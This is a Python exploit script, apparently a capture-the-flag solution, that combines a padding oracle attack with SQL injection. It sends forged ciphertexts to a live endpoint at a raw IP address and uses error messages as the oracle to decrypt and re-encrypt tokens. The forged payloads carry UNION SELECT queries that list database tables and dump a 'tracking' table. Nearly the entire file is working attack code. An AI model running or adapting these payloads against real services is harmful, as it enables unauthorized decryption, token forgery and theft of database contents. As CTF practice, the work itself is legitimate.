import binascii
import requests
from padorack import decrypt_message, encrypt_message


def decode_weird_base64(weird_base64):
    return binascii\
        .a2b_base64(weird_base64
                    .replace('~', '=')
                    .replace('!', '/')
                    .replace('-', '+'))


def encode_weird_base64(bytes_to_encode):
    return binascii\
        .b2a_base64(bytes_to_encode)\
        .decode()\
        .replace('=', '~')\
        .replace('/', '!')\
        .replace('+', '-')\
        .replace('\n', '')


def test_oracle(cipher_bytes: bytearray) -> bool:
    response = requests.get("http://35.227.24.107/94b312acd7/?post=" + encode_weird_base64(cipher_bytes))

    return "Incorrect padding" not in response.text and "PaddingException" not in response.text


# test_cipher_message = "wyUUAlIEJHHM3KLea6-fWK!N60rqu-DluOD0cfahTup66UD8GuQ26KXAat!lQZyr3dUG1gUFLUHMBhJfRbwwnkutV8co" \
#                       "ZM2ZXptiHrSui2mvmlNc3QVisFh86fHKPsJyfj0lLpSUqdfsd6Vj!eY9LzzmQ8ghI5djJ4VRWFMI18sbc2dH0r23DUpz" \
#                       "bQDr5WIR25K3MqtS0QvJc9Cng5v!Gg~~"
#
# print(decrypt_message(test_oracle, decode_weird_base64(test_cipher_message)))

# f07ff0014ab40bf39d4f77cbc8aca350202081ad199f26573fceb5f8a3cff4661a631d7f957768b338f1de15f05727f02e6de3c2c3fbfcb4d61e4e33bc7314827d6ba4500606ab43feae16bb2a87553fff5c0180e7e5e74e1552b68df6e03b20e7435ec6f287ef3444c68c61d64acaa75398b2c597062d6908df9b4aa822cd72
# print(encrypt_message(test_oracle, "{\"id\": \"0 UNION SELECT group_concat(headers), \'\' from tracking\", \"key\": \"bw7Z6mPl-lR0M!S0fwjq1Q~~\"}".encode()))
# print(encrypt_message(test_oracle, "{\"id\": \"0\", \"key\": \"bw7Z6mPl-lR0M!S0fwjq1Q~~\"}".encode()))
# print(encode_weird_base64(bytes.fromhex("96a207f047c8f9346e5b3fe743c1360788de5d57d15f4d6707c22ae995f3d73f9e837859bfd9ab4198492cd7b2346ef441f67d82a304c301c230c2b2cec79594")))
# print(encode_weird_base64(bytes.fromhex("f07ff0014ab40bf39d4f77cbc8aca350202081ad199f26573fceb5f8a3cff4661a631d7f957768b338f1de15f05727f02e6de3c2c3fbfcb4d61e4e33bc7314827d6ba4500606ab43feae16bb2a87553fff5c0180e7e5e74e1552b68df6e03b20e7435ec6f287ef3444c68c61d64acaa75398b2c597062d6908df9b4aa822cd72")))

print(
    encode_weird_base64(
        bytes.fromhex(
            encrypt_message(
                test_oracle,
                "{"
                    "\"id\": \"0 UNION SELECT group_concat(table_name), '' "
                              "FROM information_schema.tables "
                              "WHERE table_type='base table'\", "
                    "\"key\": \"bw7Z6mPl-lR0M!S0fwjq1Q~~\""
                "}".encode()
            )
        )
    )
)
